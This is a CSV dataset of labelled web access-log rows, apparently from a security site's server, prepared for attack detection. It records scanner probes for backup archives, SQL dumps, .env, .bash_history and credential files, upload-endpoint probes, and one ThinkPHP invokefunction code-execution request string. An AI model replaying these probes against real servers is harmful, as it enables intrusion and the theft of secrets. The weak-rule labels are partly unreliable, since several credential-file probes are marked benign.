source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T13:02:21-08:00,45.86.200.113,HEAD,/backup/directory.tar,,/backup/directory.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:43:12-08:00,45.8.17.9,HEAD,/backups/dump.sql,,/backups/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:53:14-08:00,45.140.245.20,HEAD,/old/mysql.sql,,/old/mysql.sql,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T05:27:31-08:00,222.186.30.188,GET,/index.php,s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,/index.php?s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,HTTP/1.1,404,338,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",command_exec,weak_rule:command_exec,Code execution/webshell pattern,METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T20:51:24-07:00,34.217.115.110,GET,/Datasets Description/HTML_Bro_log_1/dns.html,,/Datasets Description/HTML_Bro_log_1/dns.html,HTTP/1.1,200,1837,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:04-07:00,125.78.229.99,POST,/FCKeditor/editor/filemanager/connectors/asp/connector.asp,Command=FileUpload&Type=File&CurrentFolder=/,/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/,HTTP/1.1,404,328,http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:06:37-08:00,45.91.20.120,HEAD,/backup.sql,,/backup.sql,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:09:08-08:00,212.30.33.28,HEAD,/backup.rar,,/backup.rar,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:28-07:00,44.195.86.98,GET,/ups.php,,/ups.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:56-08:00,98.159.226.191,HEAD,/bak/bak.rar,,/bak/bak.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:16:43-08:00,85.10.56.247,HEAD,/www.rar,,/www.rar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:48-08:00,157.97.120.9,HEAD,/backups/credentials.txt,,/backups/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:04:41-08:00,98.159.226.187,HEAD,/backups/.env,,/backups/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:24:38-08:00,45.92.228.111,HEAD,/sftp-config.json,,/sftp-config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:30:17-08:00,185.82.72.200,HEAD,/restore/website.rar,,/restore/website.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:48-08:00,93.115.7.123,HEAD,/old/www.rar,,/old/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:31:13-08:00,157.97.120.26,HEAD,/restore/.env,,/restore/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:36-08:00,98.159.226.188,HEAD,/restore/sql.sql,,/restore/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:18-08:00,45.91.21.30,HEAD,/backups/www.sql,,/backups/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:25:24-08:00,82.118.30.80,HEAD,/back/backup.sql,,/back/backup.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:21:11-08:00,45.86.200.152,HEAD,/.bash_history,,/.bash_history,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:41:16-08:00,45.89.242.190,HEAD,/directory.rar,,/directory.rar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:27:42-08:00,85.10.56.233,HEAD,/backups/sql.sql,,/backups/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sql.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:30-07:00,44.195.86.98,GET,/upload.php,,/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:43:41-08:00,98.159.226.71,HEAD,/bak/www.rar,,/bak/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:06-08:00,212.30.33.22,HEAD,/restore/.well-known.zip,,/restore/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:18:44-08:00,98.159.226.184,HEAD,/old/.well-known.zip,,/old/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/old/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:47:13-08:00,85.10.56.234,HEAD,/restore/bak.rar,,/restore/bak.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:19:58-08:00,85.203.45.190,HEAD,/old/www.sql,,/old/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:48:38-08:00,45.128.199.81,HEAD,/back/backup.tar,,/back/backup.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:44-08:00,45.134.22.48,HEAD,/restore/dump.sql,,/restore/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/dump.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T15:12:36-07:00,128.199.13.166,GET,/,,/,HTTP/1.0,200,49096,,"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0
2022-12-22,2022-12-22T13:30:12-08:00,98.159.226.176,HEAD,/backup/secrepo.com.rar,,/backup/secrepo.com.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:08:05-08:00,85.206.175.221,HEAD,/backups/.well-known.zip,,/backups/.well-known.zip,HTTP/1.1,301,190,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:25-08:00,185.195.19.202,HEAD,/BlockCypher.log,,/BlockCypher.log,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/BlockCypher.log QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:17-08:00,212.30.36.68,HEAD,/backups/directory.tar,,/backups/directory.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:19:10-08:00,45.89.242.199,HEAD,/back/mysql.sql,,/back/mysql.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:30-08:00,98.159.226.185,HEAD,/restore/backup.rar,,/restore/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:58:36-08:00,212.30.37.121,HEAD,/restore/.bash_history,,/restore/.bash_history,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:44-08:00,185.192.71.170,HEAD,/old/public_html.tar,,/old/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:26-08:00,45.91.20.105,HEAD,/back/bak.tar,,/back/bak.tar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:10:44-08:00,98.159.226.29,HEAD,/back/directory.tar,,/back/directory.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:11:50-08:00,45.89.242.206,HEAD,/backup/.env,,/backup/.env,HTTP/1.1,301,178,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backup/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:49:29-08:00,185.221.132.213,HEAD,/old/bak.rar,,/old/bak.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:14:27-08:00,45.130.202.68,HEAD,/old/sql.sql,,/old/sql.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:20:44-08:00,84.247.59.22,HEAD,/restore/backup.sql,,/restore/backup.sql,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T23:20:02-07:00,5.159.232.239,GET,/wordpress/,,/wordpress/,HTTP/1.1,301,439,,-,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T05:15:10-08:00,222.186.180.134,GET,/data/admin/allowurl.txt,,/data/admin/allowurl.txt,HTTP/1.1,404,338,,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/data/admin/allowurl.txt QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,POST,/index.php/api/Uploadify/preview,,/index.php/api/Uploadify/preview,HTTP/1.1,404,305,http://www.secrepo.com/index.php/api/Uploadify/preview,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:50:18-08:00,82.118.30.1,HEAD,/bak.rar,,/bak.rar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:40:43-08:00,185.195.237.149,HEAD,/backup/.well-known.zip,,/backup/.well-known.zip,HTTP/1.1,301,189,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:03-08:00,194.169.217.44,HEAD,/bak/.well-known.zip,,/bak/.well-known.zip,HTTP/1.1,301,186,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/bak/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:26:56-08:00,185.192.16.11,HEAD,/backups/public_html.rar,,/backups/public_html.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:39:15-07:00,51.77.205.250,GET,/honeypot/bsidesdfw - 2014.ipynb,,/honeypot/bsidesdfw - 2014.ipynb,HTTP/1.1,301,481,,Tornado-Async-Client,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/honeypot/bsidesdfw - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:25:17-08:00,98.159.226.27,HEAD,/backups/.bash_history,,/backups/.bash_history,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:28-08:00,91.219.236.219,HEAD,/back/www.sql,,/back/www.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T17:18:08-07:00,101.89.239.238,GET,/honeypot/BSidesDFW - 2014.ipynb,,/honeypot/BSidesDFW - 2014.ipynb,HTTP/1.1,200,386900,,"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/honeypot/BSidesDFW - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:55:54-08:00,188.212.135.1,HEAD,/back/dump.sql,,/back/dump.sql,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:55:12-08:00,45.67.99.95,HEAD,/backups/secrepo.com.rar,,/backups/secrepo.com.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:11-08:00,185.217.117.25,HEAD,/bak/website.rar,,/bak/website.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/website.rar QUERY= PROTOCOL=HTTP/1.1
